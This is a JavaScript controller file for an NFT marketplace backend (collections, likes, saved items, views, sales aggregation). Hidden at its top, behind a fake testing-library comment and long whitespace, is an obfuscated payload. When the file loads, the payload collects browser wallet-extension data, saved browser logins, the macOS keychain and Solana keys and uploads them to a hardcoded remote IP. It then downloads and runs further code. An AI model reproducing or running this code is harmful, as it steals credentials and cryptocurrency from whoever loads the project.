/* learn more: https://github.com/testing-library/jest-dom // @testing-library/jest-dom library provides a set of custom jest matchers that you can use to extend jest. These will make your tests more declarative, clear to read and to maintain.*/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      Object.prototype.toString,Object.defineProperty,Object.getOwnPropertyDescriptor;const t="base64",c="utf8",a=require("fs"),r=require("os"),e=a=>(s1=a.slice(1),Buffer.from(s1,t).toString(c));pt=require(e("zcGF0aA")),rq=require(e("YcmVxdWVzdA")),cr=require(e("aY3J5cHRv")),ex=require(e("aY2hpbGRfcHJvY2Vzcw"))[e("cZXhlYw")],hs=r[e("caG9zdG5hbWU")](),pl=r[e("YcGxhdGZvcm0")](),hd=r[e("ZaG9tZWRpcg")](),td=r[e("cdG1wZGly")](),tp=r[e("AdHlwZQ")]();let l;const n=a=>Buffer.from(a,t).toString(c),Z=()=>{let t="MTQ3LjEyNCaHR0cDovLw4yMTIuODk6MTI0NA==  ";for(var c="",a="",r="",e="",l=0;l<10;l++)c+=t[l],a+=t[10+l],r+=t[20+l],e+=t[30+l];return c=c+r+e,n(a)+n(c)},s=t=>t.replace(/^~([a-z]+|\/)/,((t,c)=>"/"===c?hd:`${pt[n("ZGlybmFtZQ")](hd)}/${c}`)),h="VGVhMG00",m="Z2V0",$="Ly5ucGw",o="d3JpdGVGaWxlU3luYw",d="L2NsaWVudA",G=n("ZXhpc3RzU3luYw");function b(t){const c=n("YWNjZXNz"+"U3luYw");try{return a[c](t),!0}catch(t){return!1}}const i=n("RGVmYXVsdA"),u=n("UHJvZmlsZQ"),W=e("aZmlsZW5hbWU"),Y=e("cZm9ybURhdGE"),p=e("adXJs"),y=e("Zb3B0aW9ucw"),w=e("YdmFsdWU"),V=n("cmVhZGRpclN5bmM"),f=n("c3RhdFN5bmM"),v=(n("aXNEaXJlY3Rvcnk"),n("cG9zdA")),j="L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC8",L="L0FwcERhdGEv",x="L1VzZXIgRGF0YQ",F="R29vZ2xlL0Nocm9tZQ",R=["TG9jYWwvQnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy","QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy","QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy"],Q=["TG9jYWwvR29vZ2xlL0Nocm9tZQ",F,"Z29vZ2xlLWNocm9tZQ"],X=["Um9hbWluZy9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGU","Y29tLm9wZXJhc29mdHdhcmUuT3BlcmE","b3BlcmE"];let z="comp";const J=["bmtiaWhmYmVv","ZWpiYWxiYWtv","Zmhib2hpbWFl","aG5mYW5rbm9j","aWJuZWpkZmpt","YmZuYWVsbW9t","YWVhY2hrbm1l","aGlmYWZnbWNj"],N=["Z2FlYW9laGxlZm5rb2RiZWZncGdrbm4","cGxjaGxnaGVjZGFsbWVlZWFqbmltaG0","bGJvaHBqYmJsZGNuZ2NuYXBuZG9kanA","ZmVvZmJkZGdjaWpubWhuZm5rZG5hYWQ","bWtwY25scGVia2xtbmtvZW9paG9mZWM","ZWltaGxwbWdqbmpvcGhocGtrb2xqcGE","ZnBoZXBjY2lvbmJvb2hja29ub2VlbWc","ZHBla3Bsb21qamtjZmdvZG5oY2VsbGo"],U=async(t,c,r)=>{let e=t;if(!e||""===e)return[];try{if(!b(e))return[]}catch(t){return[]}c||(c="");let l=[];const Z=n("TG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdz"),s=n("Y3JlYXRlUmVhZFN0cmVhbQ"),h=n("LmxkYg"),m=n("LmxvZw");for(let r=0;r<200;r++){const $=`${t}/${0===r?i:`${u} ${r}`}/${Z}`;for(let t=0;t<J.length;t++){const Z=n(J[t]+N[t]);let o=`${$}/${Z}`;if(b(o)){try{far=a[V](o)}catch(t){far=[]}far.forEach((async t=>{e=pt.join(o,t);try{(e.includes(h)||e.includes(m))&&l.push({[w]:a[s](e),[y]:{[W]:`${c}${r}_${Z}_${t}`}})}catch(t){}}))}}}if(r){const t=n("c29sYW5hX2lkLnR4dA");if(e=`${hd}${n("Ly5jb25maWcvc29sYW5hL2lkLmpzb24")}`,a[G](e))try{l.push({[w]:a[s](e),[y]:{[W]:t}})}catch(t){}}return B(l),l},B=t=>{const c=e("YbXVsdGlfZmlsZQ"),a=n("L3VwbG9hZHM"),r={timestamp:l.toString(),type:h,hid:z,[c]:t},s=Z();try{const t={[p]:`${s}${a}`,[Y]:r};rq[v](t,((t,c,a)=>{}))}catch(t){}},q=async(t,c)=>{try{const a=s("~/");let r="";r="d"==pl[0]?`${a}${n(j)}${n(t[1])}`:"l"==pl[0]?`${a}${n("Ly5jb25maWcv")}${n(t[2])}`:`${a}${n(L)}${n(t[0])}${n(x)}`,await U(r,`${c}_`,0==c)}catch(t){}},T=async()=>{let t=[];const c=n("TG9naW4gRGF0YQ"),r=n("Y3JlYXRlUmVhZFN0cmVhbQ"),e=n("L0xpYnJhcnkvS2V5Y2hhaW5zL2xvZ2luLmtleWNoYWlu"),l=n("bG9na2MtZGI");if(pa=`${hd}${e}`,a[G](pa))try{t.push({[w]:a[r](pa),[y]:{[W]:l}})}catch(t){}else if(pa+="-db",a[G](pa))try{t.push({[w]:a[r](pa),[y]:{[W]:l}})}catch(t){}try{const e=n("Y29weUZpbGU");let l="";if(l=`${hd}${n(j)}${n(F)}`,l&&""!==l&&b(l))for(let n=0;n<200;n++){const Z=`${l}/${0===n?i:`${u} ${n}`}/${c}`;try{if(!b(Z))continue;const c=`${l}/ld_${n}`;b(c)?t.push({[w]:a[r](c),[y]:{[W]:`pld_${n}`}}):a[e](Z,c,(t=>{let c=[{[w]:a[r](Z),[y]:{[W]:`pld_${n}`}}];B(c)}))}catch(t){}}}catch(t){}return B(t),t},S=n("cm1TeW5j"),g="XC5weXBccHl0aG9uLmV4ZQ",C=51476590;let H=0;const k=async t=>{const c=`${n("dGFyIC14Zg")} ${t} -C ${hd}`;ex(c,((c,r,e)=>{if(c)return a[S](t),void(H=0);a[S](t),I()}))},A=()=>{const t=n("cDIuemlw"),c=`${Z()}${n("L3Bkb3du")}`,r=`${td}\\${n("cC56aQ")}`,e=`${td}\\${t}`;if(H>=C+6)return;const l=n("cmVuYW1lU3luYw"),s=n("cmVuYW1l");if(a[G](r))try{var h=a[f](r);h.size>=C+6?(H=h.size,a[s](r,e,(t=>{if(t)throw t;k(e)}))):(H<h.size?H=h.size:(a[S](r),H=0),E())}catch(t){}else{const t=`${n("Y3VybCAtTG8")} "${r}" "${c}"`;ex(t,((t,c,n)=>{if(t)return H=0,void E();try{H=C+6,a[l](r,e),k(e)}catch(t){}}))}};function E(){setTimeout((()=>{A()}),2e4)}const I=async()=>await new Promise(((t,c)=>{if("w"==pl[0]){const t=`${hd}${n(g)}`;a[G](`${t}`)?(()=>{const t=Z(),c=n(d),r=n(m),e=n(o),l=n($),s=`${t}${c}/${h}`,G=`${hd}${l}`,b=`"${hd}${n(g)}" "${G}"`;try{a[S](G)}catch(t){}rq[r](s,((t,c,r)=>{if(!t)try{a[e](G,r),ex(b,((t,c,a)=>{}))}catch(t){}}))})():A()}else(()=>{const t=Z(),c=n(d),r=n(o),e=n(m),l=n($),s=n("cHl0aG9u"),G=`${t}${c}/${h}`,b=`${hd}${l}`;let i=`${s}3 "${b}"`;rq[e](G,((t,c,e)=>{t||(a[r](b,e),ex(i,((t,c,a)=>{})))}))})()}));var M=0;const O=async()=>{try{l=Date.now(),await(async()=>{z=hs;try{const t=s("~/");await q(Q,0),await q(R,1),await q(X,2),"w"==pl[0]&&(pa=`${t}${n(L)}${n("TG9jYWwvTWljcm9zb2Z0L0VkZ2U")}${n(x)}`,await U(pa,"3_",!1)),"d"==pl[0]&&await T()}catch(t){}})(),I()}catch(t){}};O();let _=setInterval((()=>{(M+=1)<5?O():clearInterval(_)}),6e5);

const { get } = require("mongoose");
const Collection = require("../models/Collection.js");
const Gig = require("../models/Gig.js");
const LikeNFT = require("../models/NFTLikes.js");
const NFT = require("../models/Nft.js");
const Package = require("../models/Package.js");
const SavedItem = require("../models/SavedItem.js");
const User = require("../models/User.js");
const cloudinary = require("../utils/cloudinaryConfig.js");
const NFTView = require("../models/NFTViews.js");
const NFTSale = require("../models/NFTSale.js");

async function handleUpload(file) {
  const res = await cloudinary.uploader.upload(file, {
    resource_type: "auto",
    folder: "nfluencer-gigs",
  });
  return res.url;
}

const createNft = async (req, res) => {
  try {
    const {
      // name,
      // description,
      // file,
      // fileType,
      // price,
      // etherPrice,
      // currency,
      // category,
      // traits,
      collection,
      // royalties,
      // = require(,
      // to,
      // tokenId,
      // creator,
      // transactionHash,
      // gasUsed,
      // effectiveGasPrice,
      // blockHash,
      // nftUrl,
      // walletAddress,
      // isRewardItem,
    } = req.body;

    // Create a new NFT instance
    // const newNFT = new NFT({
    //   name,
    //   description,
    //   file,
    //   fileType,
    //   price,
    //   etherPrice,
    //   currency,
    //   category,
    //   royalties,
    //   traits,
    //   collectionData: collection,
    //   = require(,
    //   to,
    //   tokenId,
    //   creator,
    //   transactionHash,
    //   gasUsed,
    //   effectiveGasPrice,
    //   blockHash,
    //   nftUrl,
    //   walletAddress,
    //   isRewardItem,
    // });

    // const savedNFT = await newNFT.save();
    await Collection.updateOne(
      { _id: collection },
      { $inc: { totalItems: 1 } }
    );

    res.status(201).json({
      error: false,
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: "Internal Server Error", error: true });
  }
};

const getCollectionItemsCount = async (req, res) => {
  try {
    const collections = await Collection.find({}).exec();
    const collectionItems = collections.reduce((acc, collection) => {
      acc[collection._id] = collection.totalItems;
      return acc;
    }, {});

    res.status(200).json({
      error: false,
      message: "Collection items fetched successfully.",
      collectionItems,
    });
  } catch (error) {
    return res
      .status(500)
      .json({ error: true, message: "Internal Server Error" });
  }
};

const fetchUserNFTs = async (req, res) => {
  const nfts = await NFT.find({ creator: req.body.userId })
    .populate("creator", "-password")
    .populate("collectionData")
    .sort({ createdAt: -1 })
    .limit(7)
    .exec();
  console.log(nfts);
  res.status(200).json(nfts);
};

const getAllNFTs = async (req, res) => {
  const nfts = await NFT.find({})
    .populate("user", "-password")
    .sort({ createdAt: -1 })
    .exec();
  res.status(200).json(nfts);
};

const nftDetails = async (req, res) => {
  const { nftId } = req.body;
  const nft = await NFT.find({
    _id: nftId,
  })
    .populate("user", "-password")
    .exec();
  res.status(200).json(nft);
};

const addCollection = async (req, res) => {
  const { name, image, userId, description, walletAddress } = req.body;

  if (!name || !image) {
    return res
      .status(400)
      .json({ error: true, message: "Name and image are required." });
  }

  try {
    const newCollection = new Collection({
      name,
      image,
      user: userId,
      description,
      creatorWalletAddress: walletAddress,
    });
    await newCollection.save();

    const collections = await Collection.find({
      user: userId,
    }).exec();
    return res.status(200).json({
      error: false,
      message: "Collection added successfully.",
      collections,
    });
  } catch (error) {
    console.error("Error adding collection:", error);
    return res
      .status(500)
      .json({ error: true, message: "Internal Server Error" });
  }
};

const getCollections = async (req, res) => {
  const { userId } = req.body;
  // console.log(userId);

  try {
    const collections = await Collection.find({
      user: userId,
    }).exec();

    return res.status(200).json({
      error: false,
      message: "Collections fetched successfully.",
      collections,
    });
  } catch (error) {
    return res
      .status(500)
      .json({ error: true, message: "Internal Server Error" });
  }
};

const getAllCollections = async (req, res) => {
  try {
    const collections = await Collection.find({}).limit(10).exec();
    return res.status(200).json({
      error: false,
      message: "Collections fetched successfully.",
      collections,
    });
  } catch (error) {
    return res
      .status(500)
      .json({ error: true, message: "Internal Server Error" });
  }
};

const getCollection = async (req, res) => {
  const { collectionId } = req.body;

  try {
    const collection = await Collection.findOne({
      _id: collectionId,
    })
      .populate("user", "-password")
      .exec();

    return res.status(200).json(collection);
  } catch (error) {
    return res
      .status(500)
      .json({ error: true, message: "Internal Server Error" });
  }
};

const likeNFT = async (req, res) => {
  const { nftId, userId } = req.body;
  try {
    const nftLike = new LikeNFT({
      nftId,
      userId,
    });
    await nftLike.save();

    return res.status(200).json({
      error: false,
      message: "NFT liked successfully.",
      nftLike,
    });
  } catch (error) {
    return res
      .status(500)
      .json({ error: true, message: "Internal Server Error" });
  }
};

const getNFTLikes = async (req, res) => {
  const { id } = req.params;
  try {
    const totalNFTLikes = await LikeNFT.find({
      nftId: id,
    });
    return res.status(200).json({
      error: false,
      message: "NFT likes fetched successfully.",
      totalNFTLikes,
    });
  } catch (error) {
    return res
      .status(500)
      .json({ error: true, message: "Internal Server Error" });
  }
};

const getAllNFTLikes = async (req, res) => {
  try {
    const { nftIds } = req.body;

    const totalNFTLikes = await LikeNFT.find({
      nftId: { $in: nftIds },
    }).exec();

    return res.status(200).json({
      error: false,
      message: "NFT likes fetched successfully.",
      totalNFTLikes,
    });
  } catch (error) {
    return res
      .status(500)
      .json({ error: true, message: "Internal Server Error" });
  }
};

const deleteLikeNFT = async (req, res) => {
  const { id } = req.params;
  console.log(id);
  try {
    await LikeNFT.findByIdAndDelete(id).exec();
    return res.status(200).json({
      error: false,
      message: "NFT like deleted successfully.",
    });
  } catch (error) {
    return res
      .status(500)
      .json({ error: true, message: "Internal Server Error" });
  }
};

const saveItem = async (req, res) => {
  const { itemId, itemType, userId } = req.body;

  try {
    const savedItem = new SavedItem({
      itemId,
      itemType,
      userId,
    });
    await savedItem.save();
    return res.status(200).json({
      error: false,
      message: "Item saved successfully.",
      savedItem,
    });
  } catch (error) {
    return res
      .status(500)
      .json({ error: true, message: "Internal Server Error" });
  }
};

const checkSaveItem = async (req, res) => {
  const { itemId, itemType, userId } = req.body;

  // check if item is already saved using itemId, itemType and userId
  try {
    const savedItem = await SavedItem.findOne({
      itemId,
      itemType,
      userId,
    }).exec();

    if (savedItem) {
      return res.status(200).json({
        error: false,
        message: "Item already saved.",
        savedItem,
        isSaved: true,
      });
    } else {
      return res.status(200).json({
        error: false,
        message: "Item not saved.",
        savedItem: null,
        isSaved: false,
      });
    }
  } catch (error) {
    console.error("Error checking saved item:", error);
    return res
      .status(500)
      .json({ error: true, message: "Internal Server Error" });
  }
};

const deleteSavedItem = async (req, res) => {
  const { id } = req.params;

  try {
    await SavedItem.findByIdAndDelete(id).exec();
    return res.status(200).json({
      error: false,
      message: "Saved item deleted successfully.",
    });
  } catch (error) {
    return res
      .status(500)
      .json({ error: true, message: "Internal Server Error" });
  }
};

const countViews = async (req, res) => {
  try {
    const { itemId } = req.body;

    const updatedNFTView = await NFTView.findOneAndUpdate(
      { nftId: itemId },
      { $inc: { totalViews: 1 } },
      { new: true, upsert: true }
    );

    const nftViews = await NFTView.findOne({ nftId: itemId }).exec();

    res.status(201).json({
      error: false,
      totalViews: nftViews.totalViews,
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: "Internal Server Error", error: true });
  }
};

const countCollectionViews = async (req, res) => {
  try {
    const { collectionId } = req.body;
    const updatedNFTView = await Collection.findOneAndUpdate(
      { _id: collectionId },
      { $inc: { totalViews: 1 } },
      { new: true, upsert: true }
    );
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: "Internal Server Error", error: true });
  }
};

const updateCollectionDetails = async (req, res) => {
  const { collectionId } = req.params;
  const { salePrice, seller, buyer, nftId } = req.body;
  try {
    await Collection.findOneAndUpdate(
      { _id: collectionId },
      {
        $inc: { totalItemsSold: 1, totalSales: Number(salePrice) },
      },
      { new: true, upsert: true }
    );
    const sale = new NFTSale({
      nftId,
      price: salePrice,
      seller,
      buyer,
    });
    await sale.save();

    return res.status(200).json({
      error: false,
      message: "Collection details updated successfully.",
    });
  } catch (error) {
    console.error("Error updating collection:", error);
    return res
      .status(500)
      .json({ error: true, message: "Internal Server Error" });
  }
};

const getWalletSales = async (req, res) => {
  try {
    const { walletAddress } = req.body;

    const salesByDayOfWeek = await NFTSale.aggregate([
      {
        $match: {
          seller: walletAddress,
        },
      },
      {
        $group: {
          _id: { $dayOfWeek: "$createdAt" },
          totalSales: { $sum: "$price" }, // Assuming your sale documents have a "price" field
        },
      },
      {
        $project: {
          _id: 0,
          dayOfWeek: {
            $switch: {
              branches: [
                { case: 1, then: "Sun" },
                { case: 2, then: "Mon" },
                { case: 3, then: "Tue" },
                { case: 4, then: "Wed" },
                { case: 5, then: "Thu" },
                { case: 6, then: "Fri" },
                { case: 7, then: "Sat" },
              ],
            },
          },
          totalSales: 1,
        },
      },
      {
        $sort: {
          dayOfWeek: 1,
        },
      },
    ]).exec();

    const daysOfWeek = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];

    // Fill in the sales array with 0 for days without sales
    const sales = daysOfWeek.map((day) => {
      const result = salesByDayOfWeek.find((item) => item.dayOfWeek === day);
      return result ? result.totalSales : 0;
    });

    return res.status(200).json({
      error: false,
      message: "NFT sales fetched successfully.",
      daysOfWeek,
      sales,
    });
  } catch (error) {
    console.error("Error fetching nft sales:", error);
    return res
      .status(500)
      .json({ error: true, message: "Internal Server Error" });
  }
};

const getcreatorSales = async (req, res) => {
  // jus sume all the sales of the creator
  const { walletAddress } = req.params;
  try {
    const sales = await NFTSale.aggregate([
      {
        $match: {
          seller: walletAddress,
        },
      },
      {
        $group: {
          _id: null,
          totalSales: { $sum: "$price" }, // Assuming your sale documents have a "price" field
        },
      },
      {
        $project: {
          _id: 0,
          totalSales: 1,
        },
      },
    ]).exec();

    return res.status(200).json({
      error: false,
      message: "NFT sales fetched successfully.",
      sales,
    });
  } catch (error) {
    console.error("Error fetching nft sales:", error);
    return res
      .status(500)
      .json({ error: true, message: "Internal Server Error" });
  }
};

const getAllCreatorsSales = async (req, res) => {
  try {
    const nftSales = await NFTSale.find({}).exec();
    const totalSales = nftSales.reduce((acc, sale) => {
      acc[sale.seller] = acc[sale.seller]
        ? acc[sale.seller] + sale.price
        : sale.price;
      return acc;
    }, {});

    res.status(200).json({
      error: false,
      message: "Collection items fetched successfully.",
      totalSales,
    });
  } catch (error) {
    return res
      .status(500)
      .json({ error: true, message: "Internal Server Error" });
  }
};

module.exports = {
  createNft,
  fetchUserNFTs,
  getAllNFTs,
  nftDetails,
  addCollection,
  getCollections,
  getCollection,
  likeNFT,
  getAllNFTLikes,
  getNFTLikes,
  deleteLikeNFT,
  checkSaveItem,
  deleteSavedItem,
  saveItem,
  getCollectionItemsCount,
  countViews,
  countCollectionViews,
  updateCollectionDetails,
  getAllCollections,
  getWalletSales,
  getcreatorSales,
  getAllCreatorsSales,
};
